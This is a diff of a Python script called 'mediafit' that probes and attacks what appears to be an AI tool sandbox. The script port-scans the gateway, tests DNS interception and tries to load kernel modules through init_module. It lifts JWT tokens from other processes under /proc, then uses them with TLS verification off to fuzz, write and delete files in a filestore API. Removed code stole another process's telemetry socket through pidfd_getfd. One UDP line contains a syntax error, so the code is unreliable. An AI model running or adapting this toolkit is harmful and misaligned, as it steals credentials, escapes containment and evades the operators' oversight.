@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""mediafit v5.4.0 -- vsock_loopback load, netns listener dump, sandboxing path,
-pidfd_getfd on telemetry collector, createFile FIXED, UDP egress, nat rules."""
-import os, sys, json, re, time, ssl, base64, socket, struct, ctypes, subprocess, traceback
+"""mediafit v5.5.0 -- gateway portscan, UDP/53 forwarded-vs-intercepted,
+.ko hunt + init_module, filestore FUZZ (range/list/remove/create), bug proof."""
+import os, sys, json, re, time, ssl, base64, socket, struct, select, ctypes, subprocess, traceback
 import urllib.request, urllib.error
 
-VER="5.4.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
+VER="5.5.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
 OUTD="/mnt/user-data/outputs"
 
 OUT,G=[],{}
@@ -27,22 +27,7 @@ def step(n,f):
         w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
 _CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE
 
-def tcp2(ip,port,req=b"",timeout=12,wait=0):
-    try: s=socket.create_connection((ip,port),timeout)
-    except Exception as e: return b"",("refused" if "refused" in str(e) else "err:%s"%str(e)[:40])
-    s.settimeout(timeout)
-    if wait: time.sleep(wait)
-    try:
-        if req: s.sendall(req)
-    except Exception as e:
-        s.close(); return b"","sendfail:%s"%str(e)[:40]
-    d=b""
-    try:
-        d=s.recv(8000); st="closed" if d==b"" else "ok"
-    except socket.timeout: st="timeout"
-    except Exception as e: st="err:%s"%str(e)[:40]
-    s.close(); return d,st
-def http_json(url,method="POST",token=None,body=None,t=15,hdrs=None):
+def http_json(url,method="POST",token=None,body=None,t=15,hdrs=None,cap=400000):
     h={"User-Agent":"mediafit/"+VER}
     if token: h["Authorization"]="Bearer "+token
     if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
@@ -50,165 +35,130 @@ def http_json(url,method="POST",token=None,body=None,t=15,hdrs=None):
     if hdrs: h.update(hdrs)
     req=urllib.request.Request(url,method=method,headers=h,data=body)
     try:
-        r=urllib.request.urlopen(req,timeout=t,context=_CTX); return r.status,r.read(300000)
+        r=urllib.request.urlopen(req,timeout=t,context=_CTX); return r.status,r.read(cap)
     except urllib.error.HTTPError as e:
         try: return e.code,e.read()
         except Exception: return e.code,b""
     except Exception as e: return None,("ERR:%s"%e).encode()
 def api(m,p,tk=None,t=15): return http_json(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"})
 
-def local_cid():
-    try:
-        f=os.open("/dev/vsock",os.O_RDONLY)
-        cid=struct.unpack("I",fcntl_ioctl(f,0x7b9,struct.pack("I",0)))[0]
-        os.close(f); return cid
-    except Exception: return None
-def fcntl_ioctl(fd,req,arg):
-    import fcntl as _f; return _f.ioctl(fd,req,arg)
+def scan(ip,ports,timeout=0.7):
+    open_=[]
+    socks={}
+    for p in ports:
+        try:
+            s=socket.socket(); s.setblocking(0); s.connect_ex((ip,p)); socks[s]=p
+        except Exception: pass
+    t0=time.time()
+    while socks and time.time()-t0<timeout:
+        r,_,_=select.select(list(socks),[], [], 0.05)
+        for s in r:
+            p=socks.pop(s)
+            try:
+                err=s.getsockopt(socket.SOL_SOCKET,socket.SO_ERROR)
+                if err==0: open_.append(p)
+            except Exception: pass
+            s.close()
+    for s in socks: s.close()
+    return sorted(open_)
 
 # ------------------------------------------------------------------ 1
-def s_vsockloop():
-    head("1. vsock_loopback  <== THE BLOCKER")
-    for f in ["/proc/modules","/sys/module"]:
-        if f.endswith("modules"):
-            d=open(f).read() if os.path.exists(f) else ""
-            w("    /proc/modules: %s"%(d.strip()[:300] or "EMPTY"))
-        else:
-            try: w("    /sys/module: %s"%sorted(os.listdir(f))[:40])
-            except Exception as e: w("    /sys/module -> %s"%e)
-    for f in ["/sys/module/vsock_loopback","/sys/module/vsock","/sys/module/vmw_vsock_virtio_transport"]:
-        w("    exists %-40s %s"%(f,os.path.exists(f)))
-    rc,o,e=sh(["sh","-c","ls -d /lib/modules/* 2>/dev/null; ls /lib/modules/*/kernel/net/vmw_vsock/ 2>/dev/null"])
-    w("    modules tree: %s"%((o or e).strip()[:400]))
-    rc,o,e=sh(["sh","-c","which modprobe insmod lsmod 2>/dev/null; echo ---; ls -la /sbin/modprobe /usr/sbin/modprobe 2>/dev/null"])
-    w("    tools: %s"%((o or e).strip()[:300]))
-    # try to load
-    for cmd in ["modprobe vsock_loopback","insmod /lib/modules/$(uname -r)/kernel/net/vmw_vsock/vsock_loopback.ko"]:
-        rc,o,e=sh(["sh","-c",cmd+" 2>&1"],20)
-        w("    %-60s -> %s"%(cmd,((o or e).strip()[:200] or "rc=%d"%rc)))
-    cid=local_cid(); w("    local CID=%s"%cid)
-    if cid:
-        for port in [2024,5001,2025]:
-            d,st=tcp2("127.0.0.1",0,timeout=1) if False else (None,None)
-            try:
-                s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(8)
-                s.connect((cid,port))
-                s.sendall(b"GET /status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
-                try: r=s.recv(3000); stt="ok"
-                except socket.timeout: r=b"<timeout>"; stt="timeout"
-                w("    vsock self:%d -> %s %r"%(port,stt,r[:250]))
-                if stt=="ok": rec("P","*** process_api REACHABLE via vsock self:%d ***"%port)
-                s.close()
-            except Exception as ex:
-                w("    vsock self:%d -> %s"%(port,str(ex)[:70]))
-    else:
-        rec("U","no local CID")
+def s_net():
+    head("1. INTERFACES + GATEWAY PORTSCAN  <== new surface")
+    for f in ["/proc/net/dev","/proc/net/route","/proc/net/arp"]:
+        try:
+            w("    --- %s"%f)
+            for l in open(f).read().splitlines()[:12]: w("        %s"%l[:170])
+        except Exception as e: w("    %s -> %s"%(f,e))
+    rc,o,_=sh(["sh","-c","which ifconfig route arp 2>/dev/null; cat /proc/net/fib_trie 2>/dev/null | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' | sort -u"])
+    w("    tools/ips: %s"%o.strip()[:300])
+    gw="192.0.2.1"
+    ports=[22,53,80,443,1024,2024,2025,2375,2376,3000,4000,5000,5001,5002,5005,
+           8000,8080,8443,8888,9000,9090,9112,12345,15004,15005]
+    op=scan(gw,ports,1.0)
+    w("    gateway %s open (targeted): %s"%(gw,op))
+    if op: rec("P","gateway services: %s"%op)
+    op2=scan(gw,list(range(1,1025)),1.6)
+    w("    gateway %s open (1-1024): %s"%(gw,op2))
+    if op2: rec("P","gateway low-port services: %s"%op2)
+    for p in sorted(set(op+op2)):
+        d,st=None,None
+        try:
+            s=socket.create_connection((gw,p),4); s.settimeout(3)
+            s.sendall(b"GET / HTTP/1.0\r\n\r\n")
+            try: d=s.recv(600)
+            except Exception: d=b""
+            w("        %s:%d banner -> %r"%(gw,p,d[:200]))
+            s.close()
+        except Exception as e: w("        %s:%d -> %s"%(gw,p,str(e)[:50]))
 
 # ------------------------------------------------------------------ 2
-def s_netns():
-    head("2. NETNS LISTENER DUMP (definitive)")
-    def parse(fn):
-        out=[]
-        try: lines=open(fn).read().splitlines()[1:]
-        except Exception: return out
-        for l in lines:
-            p=l.split()
-            if len(p)<4: continue
-            loc=p[1]; stt=p[3]
-            try: ip,port=loc.split(":"); port=int(port,16)
-            except Exception: continue
-            ip=".".join(str(int(ip[i:i+2],16)) for i in (6,4,2,0))
-            if stt=="0A": out.append((fn.split("/")[-1],ip,port))
-        return out
-    ls=[]
-    for f in ["/proc/net/tcp","/proc/net/tcp6","/proc/net/udp","/proc/net/udp6"]:
-        ls+=parse(f)
-    for fam,ip,port in sorted(set(ls),key=lambda x:x[2]):
-        w("    LISTEN %-8s %-18s :%d"%(fam,ip,port))
-    rc,o,_=sh(["sh","-c","ss -ltnup 2>/dev/null | head -30 || netstat -ltnup 2>/dev/null | head -30"])
-    if o.strip(): w("    ss/netstat:\n%s"%o.strip()[:800])
-    rc,o,_=sh(["sh","-c","cat /proc/net/unix | awk '{print $NF}' | sort -u | head -40"])
-    w("    unix sockets:\n%s"%o.strip()[:700])
-    rc,o,_=sh(["sh","-c","nft list ruleset 2>/dev/null | head -60; echo ===; iptables -t nat -L -n 2>/dev/null | head -30"])
-    w("    firewall/nat:\n%s"%(o.strip()[:1200] or "none"))
-
-# ------------------------------------------------------------------ 3
-def s_pidfd():
-    head("3. pidfd_getfd -- steal telemetry collector vsock socket")
-    try:
-        libc=ctypes.CDLL("libc.so.6",use_errno=True)
-    except Exception as e:
-        rec("U","no libc: %s"%e); return
-    SYS_pidfd_open=434; SYS_pidfd_getfd=438
-    try: libc.syscall.restype=ctypes.c_long
-    except Exception: pass
-    for pid in [55,56]:
-        try:
-            pf=libc.syscall(SYS_pidfd_open,pid,0)
-            if pf<0: w("    pidfd_open(%d) -> errno %d"%(pid,ctypes.get_errno())); continue
-            try: fds=sorted(os.listdir("/proc/%d/fd"%pid),key=lambda x:int(x) if x.isdigit() else 0)
-            except Exception: fds=[]
-            got=0
-            for fd in fds:
-                try:
-                    tgt=os.readlink("/proc/%d/fd/%s"%(pid,fd))
-                except Exception: tgt="?"
-                if not tgt.startswith("socket:"): continue
-                nf=libc.syscall(SYS_pidfd_getfd,pf,int(fd),0)
-                if nf<0:
-                    w("    pid %d fd %s (%s) -> getfd errno %d"%(pid,fd,tgt,ctypes.get_errno())); continue
-                got+=1
-                w("    pid %d fd %s (%s) -> duplicated to %d"%(pid,fd,tgt,nf))
-                try:
-                    s=socket.socket(fileno=nf); s.settimeout(1.5)
-                    d=b""
-                    try: d=s.recv(2000)
-                    except socket.timeout: d=b"<timeout>"
-                    except Exception as ex: d=("ERR:%s"%ex).encode()
-                    w("        recv -> %r"%(d[:180],))
-                except Exception as ex:
-                    w("        wrap -> %s"%ex)
-                    try: os.close(nf)
-                    except Exception: pass
-            if got: rec("P","pidfd_getfd: duplicated %d sockets from pid %d"%(got,pid))
-            os.close(pf)
-        except Exception as e: w("    pid %d -> %s"%(pid,e))
-
-# ------------------------------------------------------------------ 4
-def s_paths():
-    head("4. /mnt/sandboxing + marker mounts")
-    for p in ["/mnt","/mnt/sandboxing","/mnt/sandboxing/model_tools_env",
-              "/mnt/sandboxing/model_tools_env/v1","/mnt/sandboxing/model_tools_env/v1/python",
-              "/mnt/attach","/run/sandbox-telemetry","/opt/rclone-attach"]:
-        try:
-            st=os.stat(p)
-            w("    %-52s mode=%o uid=%d size=%d"%(p,st.st_mode,st.st_uid,st.st_size))
-            if os.path.isdir(p): w("        -> %s"%sorted(os.listdir(p))[:20])
-        except Exception as e: w("    %-52s %s"%(p,str(e)[:60]))
-
-# ------------------------------------------------------------------ 5
 def s_udp():
-    head("5. UDP EGRESS (is UDP proxied?)")
-    for ip,port,lbl in [("8.8.8.8",53,"dns google"),("1.1.1.1",53,"dns cf"),
-                        ("8.8.8.8",123,"ntp"),("93.184.215.14",53,"example dns")]:
+    head("2. UDP/53 forwarded-vs-intercepted (decisive)")
+    q=b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
+    for ip,lbl in [("8.8.8.8","real DNS"),("1.1.1.1","real DNS"),
+                   ("140.82.121.4","github IP (no DNS)"),
+                   ("160.79.104.10","anthropic IP (no DNS)"),
+                   ("127.0.0.1","loopback")]:
         try:
             s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(4)
-            if port==53:
-                q=b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"+b"\x07example\x03com\x00"+b"\x00\x01\x00\x01"
-                s.sendto(q,(ip,port))
-            else: s.sendto(b"\x1b"+47*b"\0",(ip,port))
-            d,_=s.recvfrom(600)
-            w("    UDP %-16s :%d %-12s -> %d bytes %r"%(ip,port,lbl,len(d),d[:60]))
-            rec("P","UDP egress works: %s:%d"%(ip,port))
-            s.close()
+            s.sendto(q,(ip,53)); d,_=s.recvfrom(600); s.close()
+            rc=d[3]&0x0F
+            w("    UDP %-16s :53 %-22s -> %d b rcode=%d %r"%(ip,lbl,len(d),rc,d[:40]))
+            if rc in (0,3) and ip not in ("8.8.8.8","1.1.1.1","127.0.0.1"):
+                rec("P","*** UDP/53 INTERCEPTED (answered by a non-DNS IP) ***")
         except Exception as e:
-            w("    UDP %-16s :%d %-12s -> %s"%(ip,port,lbl,str(e)[:60]))
+            w("    UDP %-16s :53 %-22s -> %s"%(ip,lbl,str(e)[:60]))
+    # arbitrary udp port?
+    for port in [53,123,5353,9999]:
+        try:
+            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(3)
+            s.sendto(q,(8.8.8.8,port)); d,_=s.recvfrom(600); s.close()
+            w("    UDP 8.8.8.8:%-5d -> %d b"%(port,len(d)))
+        except Exception as e: w("    UDP 8.8.8.8:%-5d -> %s"%(port,str(e)[:50]))
 
-# ------------------------------------------------------------------ 6
+# ------------------------------------------------------------------ 3
+def s_ko():
+    head("3. kernel module hunt + init_module")
+    rc,o,_=sh(["sh","-c","find / -xdev -name '*.ko*' 2>/dev/null | head -30"])
+    w("    *.ko found: %s"%(o.strip()[:500] or "NONE"))
+    rc,o,_=sh(["sh","-c","uname -r; cat /proc/version | head -1"])
+    w("    kernel: %s"%o.strip()[:200])
+    ko=o.splitlines()
+    for p in (o.strip().splitlines() if o.strip() else []):
+        if p.endswith(".ko") and "vsock" in p:
+            try:
+                data=open(p,"rb").read()
+                libc=ctypes.CDLL("libc.so.6",use_errno=True)
+                buf=ctypes.create_string_buffer(data)
+                r=libc.syscall(105,buf,ctypes.c_ulong(len(data)),ctypes.c_char_p(b""))  # init_module
+                w("    init_module(%s) -> %s errno=%s"%(p,r,ctypes.get_errno()))
+                if r==0: rec("P","loaded %s"%p)
+            except Exception as e: w("    init_module %s -> %s"%(p,e))
+    cid=None
+    try:
+        import fcntl
+        f=os.open("/dev/vsock",os.O_RDONLY)
+        cid=struct.unpack("I",fcntl.ioctl(f,0x7b9,struct.pack("I",0)))[0]; os.close(f)
+    except Exception: pass
+    w("    local CID=%s"%cid)
+    if cid:
+        for port in [2024,5001]:
+            try:
+                s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(6)
+                s.connect((cid,port))
+                s.sendall(b"GET /status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
+                try: d=s.recv(2000)
+                except socket.timeout: d=b"<timeout>"
+                w("    vsock self:%d -> %r"%(port,d[:200])); s.close()
+                if d and b"HTTP" in d: rec("P","*** vsock self:%d LIVE ***"%port)
+            except Exception as e: w("    vsock self:%d -> %s"%(port,str(e)[:60]))
+
+# ------------------------------------------------------------------ 4
 def s_filestore():
-    head("6. FILESTORE: createFile FIXED + range")
+    head("4. FILESTORE FUZZ (range / list / remove / create)")
     JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
-    tk=None; up=None; fsid=None
+    tk=None; up=None; fsid=None; seen={}
     for pid in os.listdir("/proc"):
         if not pid.isdigit(): continue
         try:
@@ -229,9 +179,9 @@ def s_filestore():
                 if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
                 try: pl=json.loads(base64.urlsafe_b64decode(t.split(".")[1]+"=="))
                 except Exception: continue
-                f=pl.get("filesystem_id")
-                if not f: continue
-                roots=pl.get("allowed_roots") or []
+                f=pl.get("filesystem_id"); roots=pl.get("allowed_roots") or []
+                if not f or t in seen: continue
+                seen[t]=1
                 st,_=api("listDirectory",{"filesystem_id":f,"path":roots[0] if roots else "/outputs"},t)
                 if st==200:
                     fsid=f
@@ -239,25 +189,36 @@ def s_filestore():
                     if "/uploads" in roots: up=t
     w("    fsid=%s write=%s uploads=%s"%(fsid,bool(tk),bool(up)))
     if not tk: rec("U","no write token"); return
-    B="----mf"+base64.urlsafe_b64encode(os.urandom(6)).rstrip(b"=").decode()
-    def mp(params,fn,fd):
-        o=("--%(B)s\r\nContent-Disposition: form-data; name=\"params\"\r\n"
-           "Content-Type: application/json\r\n\r\n")%{"B":B}
-        o=(o+json.dumps(params)+"\r\n").encode()
-        o+=("--%(B)s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%(F)s\"\r\n"
-            "Content-Type: application/octet-stream\r\n\r\n")%{"B":B,"F":fn}
-        return o.encode()+fd+b"\r\n"+("--%s--\r\n"%B).encode()
-    H={"Content-Type":"multipart/form-data; boundary="+B,"Connect-Protocol-Version":"1"}
     api("makeDirectory",{"filesystem_id":fsid,"path":"/outputs"},tk)
+    # --- createFile (FIXED: all bytes) ---
+    B=("----mf"+base64.urlsafe_b64encode(os.urandom(6)).rstrip(b"=").decode()).encode()
+    def mp(params,fn,fd):
+        out=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"params\"\r\n"
+        out+=b"Content-Type: application/json\r\n\r\n"+json.dumps(params).encode()+b"\r\n"
+        out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fn.encode()+b"\"\r\n"
+        out+=b"Content-Type: application/octet-stream\r\n\r\n"+fd+b"\r\n"
+        return out+b"--"+B+b"--\r\n"
+    H={"Content-Type":"multipart/form-data; boundary="+B.decode(),"Connect-Protocol-Version":"1"}
     st,b=http_json(FS+"createFile","POST",tk,
-                   mp({"filesystem_id":fsid,"path":"/outputs/mf.txt","media_type":"text/plain"},
-                      "mf.txt",b"MEDIAFIT-OK"),25,H)
-    w("    createFile -> %s %s"%(st,b[:300].decode("utf-8","replace")))
+                   mp({"filesystem_id":fsid,"path":"/outputs/mf.txt","media_type":"text/plain"},"mf.txt",b"MEDIAFIT-OK"),
+                   25,H)
+    w("    createFile -> %s %s"%(st,b[:280].decode("utf-8","replace")))
     if st==200: rec("P","*** createFile WORKS ***")
+    # --- listDirectory characterisation (bug proof) ---
     st,b=api("listDirectory",{"filesystem_id":fsid,"path":"/outputs"},tk)
-    w("    listDirectory -> %s %s"%(st,b[:700].decode("utf-8","replace")))
+    w("    listDirectory /outputs -> %s body=%r"%(st,b[:400]))
+    local=sorted(os.listdir("/mnt/user-data/outputs")) if os.path.isdir("/mnt/user-data/outputs") else []
+    w("    local /outputs has %d entries: %s"%(len(local),local[:6]))
+    if st==200 and b.strip() in (b"{}",b"") and local:
+        rec("P","*** BUG PROVEN: listDirectory empty while dir is NOT empty ***")
+    for extra in [{"recursive":True},{"includeEntries":True},{"pageSize":100}]:
+        body={"filesystem_id":fsid,"path":"/outputs"}; body.update(extra)
+        st2,b2=api("listDirectory",body,tk)
+        w("    listDirectory %-18s -> %s %r"%(list(extra)[0],st2,b2[:200]))
+    # --- readFile back ---
     st,b=api("readFile",{"filesystem_id":fsid,"path":"/outputs/mf.txt"},tk)
-    w("    readFile -> %s %r"%(st,b[:140]))
+    w("    readFile -> %s %r"%(st,b[:120]))
+    # --- range beyond EOF ---
     if up:
         try:
             fl=sorted(x for x in os.listdir("/mnt/user-data/uploads") if x.lower().endswith((".png",".jpg",".jpeg")))
@@ -265,23 +226,34 @@ def s_filestore():
                 png=fl[0]; lsz=os.path.getsize("/mnt/user-data/uploads/"+png)
                 st,b=api("readFile",{"filesystem_id":fsid,"path":"/uploads/"+png},up)
                 w("    baseline -> %s len=%d local=%d"%(st,len(b),lsz))
-                for lbl,off,ln in [("at-EOF",lsz,32),("past-EOF",lsz+100,64),("way-past",lsz+100000,64)]:
+                for lbl,off,ln in [("at-EOF",lsz,32),("past-EOF",lsz+100,64),
+                                   ("way-past",lsz+100000,128),("zero-len",0,0),("neg-len",0,-5)]:
                     st2,b2=api("readFile",{"filesystem_id":fsid,"path":"/uploads/"+png,
                                            "range":{"offset":off,"length":ln}},up)
-                    w("    range %-9s off=%d len=%d -> %s got=%d"%(lbl,off,ln,st2,len(b2)))
-                    if st2==200 and lbl!="at-EOF" and len(b2)>0:
+                    w("    range %-9s off=%-8d len=%-7d -> %s got=%d %r"%(lbl,off,ln,st2,len(b2),b2[:40]))
+                    if st2==200 and lbl in ("past-EOF","way-past") and len(b2)>0:
                         rec("P","*** RANGE BEYOND EOF returned %d bytes ***"%len(b2))
         except Exception as e: w("    range -> %s"%e)
-    else:
-        w("    (no uploads token; range skipped)")
+    # --- removeFile on a directory (bug proof) ---
+    for lbl,body in [("dir /outputs",{"filesystem_id":fsid,"path":"/outputs"}),
+                     ("missing",{"filesystem_id":fsid,"path":"/outputs/__nope"}),
+                     ("file mf.txt",{"filesystem_id":fsid,"path":"/outputs/mf.txt"})]:
+        st,b=api("removeFile",body,tk)
+        w("    removeFile %-14s -> %s %s"%(lbl,st,b[:160].decode("utf-8","replace")))
+        if st==500: rec("P","*** removeFile 500 on %s ***"%lbl)
+    # --- weird paths / names ---
+    for name,mt in [("a b.txt","text/plain"),("dot.name.txt","text/plain"),
+                    ("uni_é_ñ.txt","text/plain"),("noext","application/octet-stream")]:
+        st,b=http_json(FS+"createFile","POST",tk,
+                       mp({"filesystem_id":fsid,"path":"/outputs/"+name,"media_type":mt},name,b"x"),20,H)
+        w("    createFile %-14s -> %s %s"%(name,st,b[:110].decode("utf-8","replace")))
 
 def s_verdict():
     head("VERDICT")
     w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))
 
 def main():
-    for n,f in [("vsockloop",s_vsockloop),("netns",s_netns),("pidfd",s_pidfd),
-                ("paths",s_paths),("udp",s_udp),("filestore",s_filestore),("verdict",s_verdict)]:
+    for n,f in [("net",s_net),("udp",s_udp),("ko",s_ko),("filestore",s_filestore),("verdict",s_verdict)]:
         step(n,f)
 try: main()
 except Exception as e: w("!! %s"%e); w(traceback.format_exc())
